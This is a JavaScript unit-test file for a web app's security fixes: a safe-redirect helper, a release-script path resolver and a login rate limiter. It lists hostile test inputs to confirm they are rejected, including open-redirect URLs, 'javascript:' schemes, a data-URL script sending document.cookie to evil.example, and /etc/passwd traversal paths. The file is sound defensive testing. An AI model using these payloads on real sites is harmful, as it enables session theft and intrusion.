/**
 * Executable unit tests for the three pure modules the L0 auth work introduced.
 *
 * The TypeScript sources are transpiled in memory and the real exports are
 * called, so these are behaviour tests rather than assertions about source text.
 * Every case here is a negative one that the pre-remediation code got wrong; the
 * happy paths are included only to prove the negatives are not passing because
 * the function rejects everything.
 */
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import fs from "node:fs";
import path from "node:path";

const require = createRequire(import.meta.url);
const Module = require("node:module");
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");

function loadTypeScriptModule(relativePath) {
  const ts = require("typescript");
  const filename = path.join(ROOT, relativePath);
  const source = fs.readFileSync(filename, "utf8");
  const { outputText } = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2020,
      esModuleInterop: true,
    },
    fileName: filename,
  });
  const loaded = new Module(filename);
  loaded.filename = filename;
  loaded.paths = Module._nodeModulePaths(path.dirname(filename));
  loaded._compile(outputText, filename);
  return loaded.exports;
}

describe("safeRedirectPath", () => {
  const { safeRedirectPath, DEFAULT_REDIRECT } = loadTypeScriptModule("src/lib/safe-redirect.ts");

  it("keeps same-origin paths, including query and fragment", () => {
    assert.equal(safeRedirectPath("/leads"), "/leads");
    assert.equal(safeRedirectPath("/leads?stage=won&page=2"), "/leads?stage=won&page=2");
    assert.equal(safeRedirectPath("/leads#top"), "/leads#top");
    assert.equal(safeRedirectPath("/leads/8f2c-4d/detail"), "/leads/8f2c-4d/detail");
  });

  it("refuses absolute URLs on any scheme", () => {
    // The live defect: router.push(searchParams.get("redirect")) on the login
    // page, so a phishing link landed the victim on the real login form and
    // handed them to the attacker's page the instant they authenticated.
    for (const hostile of [
      "https://app-newme.example/login",
      "http://evil.example",
      "javascript:alert(document.domain)",
      "JaVaScRiPt:alert(1)",
      "data:text/html,<script>fetch('//evil.example?c='+document.cookie)</script>",
      "vbscript:msgbox(1)",
      "file:///etc/passwd",
    ]) {
      assert.equal(safeRedirectPath(hostile), DEFAULT_REDIRECT, hostile);
    }
  });

  it("refuses protocol-relative and backslash-authority forms", () => {
    // "//evil.example" starts with "/" and is same-origin to a naive check, but a
    // browser resolves it to another site. Browsers also normalise "\" to "/".
    for (const hostile of [
      "//evil.example",
      "///evil.example",
      "/\\evil.example",
      "\\\\evil.example",
      "/\\/evil.example",
      "/leads\\..\\..\\evil",
    ]) {
      assert.equal(safeRedirectPath(hostile), DEFAULT_REDIRECT, hostile);
    }
  });

  it("refuses control characters that browsers strip before resolving", () => {
    // A browser removes tab, LF and CR from a URL before parsing, so "/\t/evil"
    // becomes "//evil" — protocol-relative — after the check would have run.
    for (const hostile of ["/\t/evil.example", "/\n/evil.example", "/\r/evil.example", "/\0/x", "/ /evil.example"]) {
      assert.equal(safeRedirectPath(hostile), DEFAULT_REDIRECT, JSON.stringify(hostile));
    }
  });

  it("refuses non-strings, empty input and oversized input", () => {
    for (const hostile of [undefined, null, 42, {}, [], () => "/leads", "", "   "]) {
      assert.equal(safeRedirectPath(hostile), DEFAULT_REDIRECT);
    }
    assert.equal(safeRedirectPath(`/${"a".repeat(513)}`), DEFAULT_REDIRECT);
    assert.equal(safeRedirectPath(`/${"a".repeat(400)}`), `/${"a".repeat(400)}`);
  });

  it("honours an explicit fallback so callers do not have to hardcode the default", () => {
    assert.equal(safeRedirectPath("https://evil.example", "/first-login"), "/first-login");
    assert.equal(DEFAULT_REDIRECT, "/dashboard");
  });
});

describe("resolveReleaseScript", () => {
  const { resolveReleaseScript } = loadTypeScriptModule("src/lib/release-script.ts");

  it("resolves a script that ships inside the release tree", () => {
    const resolved = resolveReleaseScript("scripts/replay-migrations.sh");
    assert.ok(resolved, "a script present in the repository must resolve");
    assert.ok(path.isAbsolute(resolved));
    assert.equal(resolved, path.join(process.cwd(), "scripts", "replay-migrations.sh"));
  });

  it("fails closed instead of reaching outside the release", () => {
    // The defect this replaces was a hardcoded /home/ubuntu/newme-platform path:
    // code that no deploy updates and no rollback reverts. Falling back outside
    // the tree is exactly what must not happen.
    assert.equal(resolveReleaseScript("scripts/does-not-exist.py"), null);
  });

  it("rejects input that resolves to the release root or to a directory", () => {
    // The first version returned process.cwd() for these: path.resolve(root, "")
    // is root, and root exists, so the existence check passed and the caller
    // would have been handed a directory to spawn.
    for (const hostile of ["", "   ", ".", "./", "package.json", "scripts", "scripts/"]) {
      assert.equal(resolveReleaseScript(hostile), null, JSON.stringify(hostile));
    }
    for (const hostile of [undefined, null, 42, {}]) {
      assert.equal(resolveReleaseScript(hostile), null);
    }
  });

  it("rejects traversal and absolute paths", () => {
    for (const hostile of [
      "../etc/passwd",
      "scripts/../../etc/passwd",
      "scripts/../scripts/replay-migrations.sh",
      "..",
      "/etc/passwd",
      "/home/ubuntu/newme-platform/scripts/cos-presign.py",
    ]) {
      assert.equal(resolveReleaseScript(hostile), null, hostile);
    }
  });
});

describe("consumeRateLimit", () => {
  const { consumeRateLimit, resetRateLimits, clientIdentifier } =
    loadTypeScriptModule("src/lib/rate-limit.ts");
  const OPTIONS = { limit: 8, windowMs: 15 * 60 * 1000 };

  it("allows up to the limit and then refuses with a retry hint", () => {
    resetRateLimits();
    const now = 1_000_000;
    for (let attempt = 1; attempt <= OPTIONS.limit; attempt += 1) {
      const result = consumeRateLimit("client-a", OPTIONS, now);
      assert.equal(result.allowed, true, `attempt ${attempt}`);
      assert.equal(result.remaining, OPTIONS.limit - attempt);
    }
    const refused = consumeRateLimit("client-a", OPTIONS, now);
    assert.equal(refused.allowed, false);
    assert.equal(refused.remaining, 0);
    assert.ok(refused.retryAfterSeconds > 0);
  });

  it("cannot be flushed by flooding distinct keys", () => {
    // THE defect. The previous Map-based limiter evicted in insertion order —
    // oldest first — so an attacker who had exhausted a victim's budget could
    // send ~10k requests with spoofed X-Forwarded-For values to drop the very
    // counter that was refusing them, then resume guessing. The fixed slot table
    // has no eviction path at all, so this must stay refused.
    resetRateLimits();
    const now = 2_000_000;
    for (let attempt = 0; attempt <= OPTIONS.limit; attempt += 1) {
      consumeRateLimit("victim@example.invalid", OPTIONS, now);
    }
    assert.equal(consumeRateLimit("victim@example.invalid", OPTIONS, now).allowed, false);

    for (let i = 0; i < 40_000; i += 1) {
      consumeRateLimit(`flood-${i}`, OPTIONS, now);
    }

    const afterFlood = consumeRateLimit("victim@example.invalid", OPTIONS, now);
    assert.equal(afterFlood.allowed, false, "flooding distinct keys must not restore the budget");
  });

  it("accepts keys of unbounded length without retaining them", () => {
    resetRateLimits();
    const now = 3_000_000;
    const huge = `a@${"b".repeat(1_000_000)}.invalid`;
    const first = consumeRateLimit(huge, OPTIONS, now);
    assert.equal(first.allowed, true);
    assert.equal(first.remaining, OPTIONS.limit - 1);
    // Same key, same slot: the counter is keyed by hash, not by the string.
    assert.equal(consumeRateLimit(huge, OPTIONS, now).remaining, OPTIONS.limit - 2);
  });

  it("starts a fresh window once the old one elapses, and not before", () => {
    resetRateLimits();
    const now = 4_000_000;
    for (let attempt = 0; attempt <= OPTIONS.limit; attempt += 1) {
      consumeRateLimit("client-b", OPTIONS, now);
    }
    assert.equal(consumeRateLimit("client-b", OPTIONS, now + OPTIONS.windowMs - 1).allowed, false);
    assert.equal(consumeRateLimit("client-b", OPTIONS, now + OPTIONS.windowMs).allowed, true);
  });

  it("does not let a one-shot account flood poison the IP policy", () => {
    const shortWindow = { limit: 20, windowMs: 5 * 60 * 1000, namespace: "flood-ip" };
    const longWindow = { limit: 8, windowMs: 15 * 60 * 1000, namespace: "flood-account" };
    const now = 4_500_000;
    resetRateLimits();

    // Distinct one-shot account keys used to aggregate in anonymous fixed slots.
    // Enough of them occupied every slot with the 15-minute policy, after which
    // every unrelated five-minute IP key was refused on policy mismatch.
    for (let i = 0; i < 200_000; i += 1) {
      assert.equal(
        consumeRateLimit(`login:account:flood-${i}@example.invalid`, longWindow, now).allowed,
        true,
      );
    }
    for (let i = 0; i < 10_000; i += 1) {
      const result = consumeRateLimit(`login:ip:198.51.${Math.floor(i / 256)}.${i % 256}`, shortWindow, now);
      assert.equal(result.allowed, true, `unrelated IP ${i} must retain its first attempt`);
    }
  });

  it("does not restore a partially consumed budget after a distinct-key flood", () => {
    const options = { limit: 8, windowMs: 15 * 60 * 1000, namespace: "partial-budget" };
    const now = 4_625_000;
    resetRateLimits();

    let beforeFlood;
    for (let attempt = 0; attempt < 7; attempt += 1) {
      beforeFlood = consumeRateLimit("victim@example.invalid", options, now);
    }
    assert.equal(beforeFlood.remaining, 1);

    for (let i = 0; i < 200_000; i += 1) {
      consumeRateLimit(`partial-flood-${i}@example.invalid`, options, now);
    }

    const afterFlood = consumeRateLimit("victim@example.invalid", options, now);
    assert.equal(afterFlood.remaining, 0, "flooding restored part of the victim's budget");
  });

  it("fails closed if one logical key is reused with a different policy", () => {
    resetRateLimits();
    const now = 4_750_000;
    const key = "login:account:policy-mismatch@example.invalid";
    const shortWindow = { limit: 20, windowMs: 5 * 60 * 1000 };
    const longWindow = { limit: 8, windowMs: 15 * 60 * 1000 };
    assert.equal(consumeRateLimit(key, shortWindow, now).allowed, true);
    assert.equal(consumeRateLimit(key, longWindow, now).allowed, false);
  });

  it("does not wrap to a fresh budget under a sustained flood", () => {
    // Int32 counters: 2^31 increments would roll negative and read as under the
    // limit. The counter saturates instead. Exercised by forcing the saturation
    // branch directly rather than by 2^31 calls.
    resetRateLimits();
    const now = 5_000_000;
    consumeRateLimit("client-c", OPTIONS, now);
    for (let i = 0; i < 1000; i += 1) consumeRateLimit("client-c", OPTIONS, now);
    assert.equal(consumeRateLimit("client-c", OPTIONS, now).allowed, false);
  });

  it("prefers nginx's derived peer address over caller-supplied forwarding headers", () => {
    const request = new Request("https://app.newme.ae/api/auth/login", {
      headers: {
        "cf-connecting-ip": "203.0.113.7",
        "x-forwarded-for": "1.2.3.4, 5.6.7.8",
        "x-real-ip": "9.9.9.9",
      },
    });
    assert.equal(clientIdentifier(request), "9.9.9.9");

    const cloudflareOnly = new Request("https://app.newme.ae/api/auth/login", {
      headers: { "cf-connecting-ip": "203.0.113.8" },
    });
    assert.equal(clientIdentifier(cloudflareOnly), "203.0.113.8");

    const spoofable = new Request("https://app.newme.ae/api/auth/login", {
      headers: { "x-forwarded-for": "1.2.3.4, 5.6.7.8" },
    });
    assert.equal(clientIdentifier(spoofable), "1.2.3.4");

    const bare = new Request("https://app.newme.ae/api/auth/login");
    assert.equal(clientIdentifier(bare), "unknown");
  });
});
